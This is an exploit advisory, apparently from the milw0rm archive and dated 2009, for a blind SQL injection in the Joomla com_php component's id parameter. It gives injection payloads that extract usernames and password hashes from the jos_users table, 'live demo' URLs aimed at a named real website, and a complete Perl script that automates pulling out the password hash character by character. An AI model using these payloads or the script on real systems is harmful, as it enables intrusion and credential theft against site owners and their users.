<html><head><title>Joomla Component com_php (id) Blind SQL Injection Vulnerability</title></head><pre>                       
------------------------------------------------------------------------------
Joomla Component com_php (id) Blind SQL-injection Vulnerability
------------------------------------------------------------------------------


 #####################################################
 # [+] Author        :  Chip D3 Bi0s                 #
 # [+] Email         :  chipdebios[alt+64]gmail.com  #
 # [+] Vulnerability :  Blind SQL injection          #
 # [+] Group         :  LatinHackTeam                #
 #####################################################

**********************************************************************
 Info Cms:
 * @name      : PHP Component
 * @author    : gabe@fijiwebdesign.com
 * @copyright : (c) fijiwebdesign.com
 * @license   : http://www.fijiwebdesign.com/
 * @dowloand : http://code.google.com/p/joomla-php/downloads/list
**********************************************************************

Example:
http://localHost/path/index.php?option=com_php&amp;Itemid=x&amp;id=y&lt;Sql Code&gt;

x = number Itemid valid
y = number id valid

&lt;Sql code&gt;:

table jos_users:
+and+(select+1+from+jos_users+limit+0,1)=1

column password:
+and+(select+substring(concat(1,password),1,1)+from+jos_users+limit+0,1)=1

column username:
+and+(select+substring(concat(1,username),1,1)+from+jos_users+limit+0,1)=1

caracter ascii
+and+ascii(substring((SELECT+concat(password)+from+jos_users+limit+0,1),1,1))&gt;57

etc, etc...

DEMO LIVE:

http://www.mercadominas.com.br/index.php?option=com_php&amp;Itemid=70&amp;id=131+and+1=1 
true

http://www.mercadominas.com.br/index.php?option=com_php&amp;Itemid=70&amp;id=131+and+1=2
else

http://www.mercadominas.com.br/index.php?option=com_php&amp;Itemid=70&amp;id=131+and+ascii(substring((SELECT+concat(password)+from+jos_users+limit+0,1),1,1))=58
else

http://www.mercadominas.com.br/index.php?option=com_php&amp;Itemid=70&amp;id=131+and+ascii(substring((SELECT+concat(password)+from+jos_users+limit+0,1),1,1))=57
true

note : in http://www.mercadominas.com.br
x = number Itemid valid    : 70
y = number id valid        : 131

Date and 1=1 &amp; not and 1=2 : com_search ---&gt;use script

etc, etc....

+++++++++++++++++++++++++++++++++++++++
#[!] Produced in South America
+++++++++++++++++++++++++++++++++++++++

if you want to save the work, you can use the following script,	
gives you password, you are free to modify it ;)
--------------------------------------------------------------------

#!/usr/bin/perl -w
use LWP::UserAgent;
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;
print &quot;\t\t                      |  Chip d3 Bi0s |                       \n\n&quot;;
print &quot;\t\t Joomla Component com_php (id) Blind SQL-injection        \n\n&quot;;
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;
print &quot;[-] http://wwww.host.org/Path: &quot;;
chomp(my $target=&lt;STDIN&gt;);
print &quot;[-] Introduce Itemid: &quot;;
chomp($itemid=&lt;STDIN&gt;);
print &quot;[-] Introduce id: &quot;;
chomp($id=&lt;STDIN&gt;);
print &quot;[-] Dato para and 1=1 &amp; no para and 1=2 : &quot;;
chomp($z=&lt;STDIN&gt;);

print &quot;[+] Password: &quot;;
$column_name=&quot;concat(password)&quot;;
$table_name=&quot;jos_users&quot;;
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');


for ($x=1;$x&lt;=32;$x++)
{            
  for ($c=48;$c&lt;=57;$c++) 
{
 $host = $target . &quot;/index.php?option=com_php&amp;Itemid=&quot;.$itemid.&quot;&amp;id=&quot;.$id.&quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c;

 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $z;
 if ($content =~ /$regexp/) {$char=chr($c); print &quot;$char&quot;;}
 }
for ($c=97;$c&lt;=102;$c++) 
{
 $host = $target . &quot;/index.php?option=com_php&amp;Itemid=&quot;.$itemid.&quot;&amp;id=&quot;.$id.&quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $z;
 if ($content =~ /$regexp/) {$char=chr($c); print &quot;$char&quot;;}
 }
}

# milw0rm.com [2009-06-29]</pre></html>